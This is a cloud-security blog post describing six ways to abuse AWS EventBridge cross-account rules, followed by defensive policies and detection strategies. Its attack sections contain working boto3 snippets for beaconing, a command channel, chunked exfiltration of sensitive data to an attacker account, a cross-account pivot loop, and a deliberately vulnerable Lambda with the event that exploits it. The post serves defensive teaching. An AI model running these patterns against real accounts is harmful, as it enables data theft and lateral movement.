---
title: "Hijacking Amazon EventBridge for launching Cross"
author: "Unknown"
url: "https://developer.squareup.com/blog/hijacking-amazon-eventbridge-for-launching-cross-account-attacks"
date: "2025-09-15"
---

June 25, 2025 | 12 minute read
# Hijacking Amazon EventBridge for launching Cross-Account attacks
### Securing the invisible paths: How cross-account event flows can become security blind spots
AWS EventBridge is a serverless event bus service that enables powerful integrations across multiple AWS accounts. While this cross-account capability is essential for building modern, decoupled architectures, it also introduces potential security risks when not properly configured. This article explores how legitimate EventBridge cross-account configurations can be exploited by attackers and provides practical guidance for securing your environment.
## Understanding Cross-Account EventBridge Architecture
A typical cross-account EventBridge setup involves:
1.**Source Account**: Defines the event source and initial event bus
2.**Destination Account**: Defines the target event bus and processing resources
3.**Event Rules**: Defines which events are forwarded between accounts.
4.**Event Targets**: Defines what resources to invoke when rules match. These targets can be This can be an event bus, sqs, sns or lambda
5.**IAM Roles**: Defines necessary permissions for cross-account access
Consider a common bidirectional setup between two accounts:
Account A (123456789) ⟷ Account B (987654321)
### Forward Path (Account A → Account B)
[Lambda in A] → [Event Bus in A] → [Forward Rule in A] → [Event Bus in B]
### Reverse Path (Account B → Account A)
[Lambda in B] → [Event Bus in B] → [Response Rule in B] → [Lambda in A]
This architecture enables legitimate use cases like centralized logging, cross-account workflow orchestration, and service-to-service communication across account boundaries.
## From Legitimate Use to Attack Vector
The same features that make EventBridge powerful for legitimate use can be misused by attackers. EventBridge's cross-account capabilities create two primary security concerns:
**Infiltration (Inbound Risk)**: Attackers can send events from untrusted/low trust accounts into your organization's accounts, potentially triggering Lambda functions, workflows, or other processes. This allows external actors to inject data or commands into your environment, bypassing traditional network controls. For example, an attacker could send specially crafted events that exploit input validation weaknesses in your event processing logic.
**Exfiltration (Outbound Risk)**: Attackers with access to your AWS accounts can leverage EventBridge to send data outside your organization. By creating rules that forward events to external accounts, sensitive information can be extracted in small chunks that evade traditional data loss prevention controls. The lack of content inspection for events makes this particularly concerning for organizations with strict data governance requirements.
Let's explore six attack patterns that leverage these infiltration and exfiltration capabilities:
### Attack 1: Persistent Beaconing - "Phoning Home"
**MITRE ATT &CK Connection:**Command and Control (T1102), Persistence (T1078)
An attacker who has compromised a Lambda function in the victim's account modifies it to regularly send small "check-in" messages through EventBridge to their own attacker-controlled account, establishing a persistent presence that can survive many detection and remediation efforts.
+------------------+ +-------------------+ +------------------+
| Compromised | | Victim's | | Cross-Account |
| Lambda in +----->| EventBridge +----->| Rule +----->
| Victim Account | | (Account A) | | |
+------------------+ +-------------------+ +------------------+
Sends regular Forwards events based Attacker recieves
"check-in" events on pattern matching & processes events
The attacker adds code to an existing Lambda function that sends a small message every hour:
# Added to an existing Lambda function
events = boto3.client('events')
events.put_events(
Entries=[{
'Source': 'system.monitor', # Looks innocent
'DetailType': 'HealthCheck',
'Detail': json.dumps({"id": "12345", "status": "active"}),
'EventBusName': 'default'
}]
)
These messages look like normal system health checks but confirm to the attacker that they still have access. What makes this attack particularly concerning is that Eventbridge PutEvents API call operations are data plane calls not logged by CloudTrail, making detection difficult. The attack creates a persistent backdoor that operates through legitimate AWS services, bypassing traditional network monitoring tools. Success depends on having sufficient permissions to establish the cross-account event flow.
### Attack 2: Command and Control - "Remote Control"
**MITRE ATT &CK Connection:**Command and Scripting Interpreter (T1059), Non-Standard Protocol (T1095)
Attackers can use EventBridge to send commands to compromised systems and receive responses, creating a hidden communication channel that bypasses firewalls and network monitoring. This bidirectional control channel enables attackers to maintain access and execute commands without establishing direct network connections that might trigger security alerts.
+-------------+ +-------------+ +------------------+
| | | | | |
| Attacker +------->| EventBridge +------->| Compromised |
| | | | | Lambda |
+------+------+ +-------------+ +--------+---------+
^ |
| |
| v
| +-------------+ +-------+----------+
| | | | |
+---------------+ EventBridge |<-------+ Results sent |
| | | back |
+-------------+ +------------------+
Command and Control Flow
The attacker sets up a two-way communication channel, sending commands hidden in normal-looking events:
events.put_events(
Entries=[{
'Source': 'maintenance.system',
'DetailType': 'ConfigUpdate',
'Detail': json.dumps({
'component': 'logger',
'config': {
'settings': "base64_encoded_command" # Hidden command
}
})
}]
)
A compromised Lambda in the victim account decodes and runs these commands, then encodes and sends results back through EventBridge (either via a rule targeting the eventbus or lambda/sqs/sns in their account), completing the control loop. In fact, if it is a lambda and if it has wide scope and permissions, it doesn't even need to be compromised. An attacker can misuse these permissions to achieve the same goal in feedback loop systems. The attack is particularly stealthy because it leverages legitimate AWS services and appears as standard JSON-formatted events, not suspicious network traffic. Network security controls like firewalls and VPC configurations are bypassed entirely since EventBridge is an allowed service.
### Attack 3: Reconnaissance - "Spying on Your Events"
**MITRE ATT &CK Connection:**Discovery (T1526), Collection (T1530)
After gaining access to a victim's AWS account, an attacker creates a rule within that account to capture all events flowing through the EventBridge. This passive reconnaissance technique allows them to collect valuable information about the victim's infrastructure, applications, and data without making suspicious API calls that might trigger alerts.
+------------------+ +-------------------+ +------------------+
| All Events | | Attacker's | | Attacker's |
| in Victim +------->| EventBridge +------->| Lambda |
| Account | | Rule | | Function |
+------------------+ +-------------------+ +--------+---------+
|
v
+--------+---------+
| Store or |
| Forward |
| Captured Data |
+------------------+
Reconnaissance Flow
The attacker creates a rule that captures all events:
# Create a rule that matches all events in the victim's account
events = boto3.client('events')
events.put_rule(
Name='system-diagnostic-collector',
EventPattern= {"source": [{"exists": true}]},
# Matches all events with any standard AWS event with "source" in it
# You could also use "source": [{"prefix": ""}] to match all events
State='ENABLED',
Description='System diagnostics collection' # Innocent-looking description
)
# Target a Lambda function the attacker controls within the victim's account
events.put_targets(
Rule='system-diagnostic-collector',
Targets=[{
'Id': 'DiagnosticsProcessor',
'Arn': 'arn:aws:lambda:region:victim-account:function:attacker-controlled-lambda'
}]
)
The Python code above shows how an attacker that has compromised a lambda in the victim's account with large permissions, creates an EventBridge rule with an empty pattern to capture all events, then targets it to a Lambda function they control.
The attacker's Lambda function then processes these events and either stores the information for later retrieval or sends it to an external system. The empty event pattern (`{"source": [{"exists": true}]}`) matches all standard events (with source in it), providing the attacker with a complete view of all event activity within the account. Attackers can use this information to completely map the victim’s environment(s). Events may contain sensitive operational data, credentials, or business information that can be used to plan more sophisticated attacks.
### Attack 4: Data Exfiltration - "Smuggling Data Out"
**MITRE ATT &CK Connection:**Exfiltration Over Alternative Protocol (T1048), Data Transfer Size Limits (T1030)
Attackers can steal sensitive data by breaking data into small pieces and sending it through EventBridge events, avoiding detection systems that look for large data transfers. This technique exploits the fact that EventBridge is designed for small, frequent event messages and is rarely monitored for data exfiltration.
+------------------+ +-------------------+ +------------------+
| Sensitive Data | | Break Into | | Send as |
| in Victim +------->| Small Chunks +------->| Multiple |
| Account | | | | Events |
+------------------+ +-------------------+ +--------+---------+
|
v
+------------------+ +-------------------+ +--------+---------+
| Reassemble | | Attacker's | | Cross-Account |
| Complete |<-------+ Account |<-------+ EventBridge |
| Data | | | | or Lambda |
+------------------+ +-------------------+ +------------------+
Data Exfiltration Flow
# Access sensitive customer data
customer_data = get_sensitive_data()
encoded_data = base64.b64encode(customer_data).decode()
# Break into small chunks to avoid detection
chunks = [encoded_data[i:i+100] for i in range(0, len(encoded_data), 100)]
# Send each chunk in a separate event
for i, chunk in enumerate(chunks):
events.put_events(
Entries=[{
'Source': 'app.telemetry',
'DetailType': 'MetricsUpdate',
'Detail': json.dumps({
'service': 'user-api',
'metrics': {
'requestCount': 42,
'errorRate': 0.01,
'meta': chunk # Hidden data
},
'sequence': i
})
}]
)
time.sleep(10) # Space out requests
Here, the attacker disguises the data as normal telemetry events, and by spacing out the requests, the attacker can exfiltrate sensitive information without triggering alerts. The small chunk size avoids triggering data volume alerts, while the time delays between events prevent rate limiting or burst detection. Since PutEvents API call operations aren't logged in CloudTrail, forensic analysis becomes extremely difficult.
### Attack 5: Cross-Account Movement - "Account Hopping"
**MITRE ATT &CK Connection:**Trusted Relationship (T1199), Lateral Movement (T1210)
An attacker who owns a low-trust dev account can pivot into staging and then production by abusing the cross-account EventBridge rules and execution roles that teams often configure for CI/CD or telemetry. EventBridge itself will not forward an event to a third account (“one-hop” rule) so the adversary simply re-emits a fresh event from inside each newly breached account. If the next bus’s resource policy trusts the caller’s account or Organization ID and a role in that account can invoke PutEvents, the hop succeeds.
+------------------+ +-------------------+ +------------------+
| Attacker in | | EventBridge Rule | | EventBus in |
| dev (Account A) +------->| (Sends to Acct B) +------->| staging (Acct B) |
+------------------+ +-------------------+ +------------------+
|
v
+------------------+
| EventBus in |
| prod (Acct C) |
+------------------+
|
v
+--------+---------+
| Target Resource |
| (e.g., Lambda |
| in prod Acct C) |
+------------------+
Cross-Account Movement Flow
The attacker discovers and exploits cross-account event rules by enumerating through the rule list:
# Find rules that send events to other accounts
import boto3, json, re
events = boto3.client("events")
next_t = None
acct_id = boto3.client("sts").get_caller_identity()["Account"]
while True:
resp = events.list_rules(EventBusName="default", NextToken=next_t) # explicit bus
for rule in resp["Rules"]:
for tgt in events.list_targets_by_rule(Rule=rule["Name"],
EventBusName="default")["Targets"]:
if "event-bus" in tgt["Arn"]: # cross-account bus
trg_acct = tgt["Arn"].split(":")[4]
if trg_acct != acct_id:
events.put_events(
Entries=[{
"Source": "com.acme.devops", # custom, allowed
"DetailType": "ScheduledEvent",
"Detail": json.dumps({"payload": "malicious"}),
"EventBusName": tgt["Arn"]
}]
)
print(f"Pivoted to {tgt['Arn']}")
next_t = resp.get("NextToken")
if not next_t:
break
Prod and staging buses often trust any account in the organization, and each cross-account rule already owns an IAM role that lets it call events:PutEvents on the target bus; by re-using that role and sending a fresh event at every hop, the attacker slips past the one-hop limit (for Eventbridge forwarding), lands in prod, and triggers whatever privileged workflows or data access the prod rules and Lambdas perform—without ever needing direct network reach or identical vulnerabilities in each account.
### Attack 6: Event Consumer Input Validation Bypass - "API Borrowing"
**MITRE ATT &CK Connection:**Exploitation of Remote Services (T1210), Command and Scripting Interpreter (T1059)
Attackers can exploit insufficient input validation in Lambda functions (or other application processing systems) that process EventBridge events to execute unintended AWS API calls. This attack is particularly effective in cross-account scenarios where Lambda functions implicitly trust events from partner accounts and dynamically invoke AWS services based on event data.
+------------------+ +------------------+ +------------------+
| Attacker in | | Send Malicious | | Vulnerable |
| Account B +---->| Event +---->| Lambda in |
| | | | | Account A |
+------------------+ +------------------+ +-------+----------+
|
v
+------------------+ +------------------+ +-------+----------+
| Attacker | | Response Event | | AWS API |
| Receives |<----+ with Sensitive |<----+ Called with |
| Data | | Data | | Lambda's Role |
+------------------+ +------------------+ +------------------+
API Borrowing Attack Flow
A vulnerable Lambda function in Account A might look like:
def lambda_handler(event, context):
"""
Process configuration events from trusted partner account.
"""
# Extract configuration details
resource_type = event['detail']['resource_type']
action = event['detail']['action']
parameters = event['detail']['parameters']
# VULNERABLE: No validation of resource_type, action, or parameters
# Initialize AWS client based on resource type
client = boto3.client(resource_type)
try:
# VULNERABLE: Dynamically call AWS API based on event data
response = getattr(client, action)(**parameters)
# Send result back to partner account
events_client = boto3.client('events')
# Events with source starting with`aws.`will be denied (aws reserved).
# And so, the attacker uses amazon.aws. to make it look legit.
events_client.put_events(
Entries=[{
'Source': 'amazon.aws.partner.config.response',
'DetailType': 'Configuration Result',
'Detail': json.dumps({
'request_id': event['detail'].get('request_id'),
'status': 'success',
'result': json.dumps(response)
}),
'EventBusName': 'arn:aws:events:us-east-1:ACCOUNT-B-ID:event-bus/partner-bus'
}]
)
return {
'statusCode': 200,
'body': 'Configuration processed successfully'
}
except Exception as e:
# Log error and notify partner
print(f"Error processing configuration: {str(e)}")
# Error handling code...
The attacker in Account B exploits this vulnerability that blindly executes AWS API calls based on event data, allowing an attacker to access sensitive information like Secrets Manager contents and exfiltrate it through the pre-established feedback loop back to their own account:
# Attacker code in Account B
events_client = boto3.client('events')
# Exploit the vulnerable Lambda to read secrets
events_client.put_events(
Entries=[{
'Source': 'amazon.aws.partner.config', # Trusted source
'DetailType': 'Configuration Update',
'Detail': json.dumps({
'resource_type': 'secretsmanager', # AWS service to target
'action': 'list_secrets', # AWS API to call
'parameters': '', # No parameters needed for this API call
'request_id': 'exfil-1' # To track the response
}),
'EventBusName': 'arn:aws:events:us-east-1:ACCOUNT-A-ID:event-bus/incoming-events'
}]
)
This attack abuses trust relationships between partner accounts, with the vulnerable Lambda function acting as a proxy that executes commands with its own permissions. The attacker can access any AWS service the Lambda has permissions for, effectively bypassing IAM restrictions by leveraging the Lambda's execution role.
## Implementing Effective Security Controls
To protect against these attack patterns, we recommend implementing security controls at multiple levels:
### Organization-Level Controls
**1\. Service Control Policies (SCPs)**SCPs can prevent unauthorized cross-account event flows:
{
"Version": "2012-10-17",
"Statement": [{
"Sid": "DenyEventBridgeCrossOrgAccess",
"Effect": "Deny",
"Action": "events:PutEvents",
"Resource": "*",
"Condition": {
"StringNotEquals": {
"aws:ResourceOrgID": "${aws:PrincipalOrgID}"
}
}
}]
}
This SCP prevents events from being sent outside your organization. For more granular control, you could use an allowlist of trusted partner organizations or accounts.
**2\. AWS Organizations**
* Use Organizations to enforce consistent security controls across accounts
* Implement tagging strategies to identify approved cross-account event flows
**3\. Resource Control Policies (RCPs)**While Service Control Policies (SCPs) restrict who can send events cross-account, Resource Control Policies (RCPs) could restrict which resources can receive those events, closing the security loop. Today however, RCPs are not yet available for EventBridge event buses.
Use SCPs to prevent exfiltration (outbound) and RCPs to prevent infiltration (inbound) for comprehensive protection.
### Account-Level Controls
**1\. IAM Permissions**
* Follow least privilege principles for EventBridge permissions
* Use permission boundaries to limit maximum permissions
* Regularly audit IAM roles with EventBridge access
**2\. EventBridge Resource Policies**Apply restrictive policies to event buses and/or the relevant EventBridge targets (Lambda/SNS/SQS/Api Gateway/Kinesis) to ensure traffic is only coming from expected sources:
{
"Version": "2012-10-17",
"Statement": [{
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::TRUSTED-ACCOUNT-ID:root"
},
"Action": "events:PutEvents",
"Resource": "arn:aws:events:region:account-id:event-bus/bus-name",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "TRUSTED-ACCOUNT-ID"
}
}
}]
}
This policy allows only specific trusted accounts and trusted AWS service to send events to your event bus, preventing unauthorized access from other accounts.
**3\. VPC Endpoints**Use VPC endpoints with restrictive policies to control access to EventBridge:
{
"Version": "2012-10-17",
"Statement": [{
"Effect": "Allow",
"Action": "events:PutEvents",
"Resource": "*",
"Principal": { "AWS": "arn:aws:iam::YOUR-ACCOUNT-ID:root" }
}
]
}
You can also add security groups to the VPC endpoint to further restrict access to specific resources or IP ranges.
### Service-Level Controls
**1\. Specific Event Patterns**Use highly specific event patterns in rules:
{
"source": ["aws.specific-service"],
"detail-type": ["Specific Event Type"],
"detail": {
"state": ["specific-state"],
"resource-type": ["specific-resource"]
}
}
**2\. Event Content Validation**Implement Lambda functions that validate event contents before processing:
def lambda_handler(event, context):
# Validate event structure and content
if not validate_event_structure(event):
log_suspicious_event(event)
return
# Process valid event
process_event(event)
**3\. Rule Auditing**
* Regularly review EventBridge rules, especially those with cross-account targets
* Alert on new rules with broad patterns or suspicious targets
* Monitor for rules with empty event patterns that match all events
## Detection Strategies
Even with preventive controls in place, detection remains critical. Here are key strategies:
**1\. CloudWatch Metrics**Monitor key EventBridge metrics:
*`PutEvents`API calls (volume and patterns)
*`TriggeredRules`for unusual activity
*`FailedInvocations`which might indicate attempted abuse
**2\. CloudTrail Analysis**Monitor for suspicious EventBridge API calls:
*`PutRule`operations with empty or broad patterns
*`PutTargets`operations with cross-account targets
**3\. Content Analysis**
* Implement Lambda pre-processors that validate event contents
* Create custom metrics when Lambda functions detect potentially encoded data or command patterns
* For critical systems, store events in a secure location for forensic analysis
**4\. Behavioral Analytics**
* Establish baselines for normal EventBridge activity
* Alert on unusual patterns, volumes, or timing of events
* Look for periodic patterns that might indicate beaconing
**5\. Billing and Cost Monitoring**
* Set up CloudWatch billing alarms for unexpected AWS charges
* Correlate billing spikes with EventBridge API and event metrics
## Conclusion
AWS EventBridge provides powerful capabilities for building event-driven, cross-account architectures. However, these same capabilities can be exploited by attackers for data exfiltration, command and control, reconnaissance, and lateral movement.
By understanding the attack patterns and implementing appropriate security controls, we can secure EventBridge implementations while still benefiting from their integration capabilities. The most effective approach combines:
1.**Preventive Controls**: SCPs, IAM permissions, resource policies, VPC endpoints, IaC configuration policies (like Checkov, etc.)
2.**Detective Controls**: Monitoring, logging, content analysis, billing alerts, and behavioral analytics
3.**Architectural Controls**: Specific event patterns, content validation, VPC endpoints
Another point to note is that, an attacker can mix and match these attacks by pointing traffic directly to cross-account SQS, SNS, or Lambdas. But that can come at the cost of detection and alerting, as these services are more likely to be monitored than EventBridge events due to the nature of how eventbridge works and is used. Therefore, it is crucial to maintain a holistic security posture that includes both preventive and detective measures.
Remember that EventBridge security should be part of your broader AWS security strategy, with defense-in-depth measures that protect against both external and insider threats.
## References
1. [MITRE ATT&CK Cloud Tactics](https://attack.mitre.org/tactics/TA0006/)
2. [AWS EventBridge Security Best Practices](https://docs.aws.amazon.com/eventbridge/latest/userguide/eb-security.html)
3. [AWS Service Control Policies](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps.html)
4. [EventBridge Resource-Based Policies](https://docs.aws.amazon.com/eventbridge/latest/userguide/eb-use-resource-based.html)
5. [AWS Security Blog: Cross-Account Access Control](https://aws.amazon.com/blogs/security/how-to-control-access-to-aws-resources-based-on-aws-account-ou-or-organization/)
6. [Backdooring an AWS account](https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9)
7. [Tracking Adversaries in AWS Using Anomaly Detection](https://www.tenable.com/blog/tracking-adversaries-in-aws-using-anomaly-detection#:~:text=Now%20an%20Event%20Bridge%20rule,created%20by%20triggering%20the%20Lambda)
8. [MITRE ATT&CK for AWS: Understanding Tactics, Detection, and Mitigation](https://www.stream.security/post/mitre-attck-for-aws-understanding-tactics-detection-and-mitigation#:~:text=,directly%2C%20so%20manual%20monitoring%20or)
9. [EventBridge Cross-Account Event Flow](https://aws.amazon.com/blogs/compute/using-amazon-eventbridge-to-build-cross-account-event-driven-applications/)
10. [Resource Control Policies](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_rcps.html)
#### Authored By
![Picture of Ramesh Ramani](https://images.ctfassets.net/1wryd5vd9xez/2frjOndqzQMRXWSBDzieH0/19a84bb981422ef9d586068be162fbc0/E01BAFDEXUP-UR8PEE1CP-4dfbf34a0bf6-512?w=50&h=50&fl=progressive&q=100&fm=jpg)
**Ramesh Ramani**
Table Of Contents
* Understanding Cross-Account EventBridge Architecture
* Forward Path (Account A → Account B)
* Reverse Path (Account B → Account A)
* From Legitimate Use to Attack Vector
* Attack 1: Persistent Beaconing - "Phoning Home"
* Attack 2: Command and Control - "Remote Control"
* Attack 3: Reconnaissance - "Spying on Your Events"
* Attack 4: Data Exfiltration - "Smuggling Data Out"
* Attack 5: Cross-Account Movement - "Account Hopping"
* Attack 6: Event Consumer Input Validation Bypass - "API Borrowing"
* Implementing Effective Security Controls
* Organization-Level Controls
* Account-Level Controls
* Service-Level Controls
* Detection Strategies
* Conclusion
* References
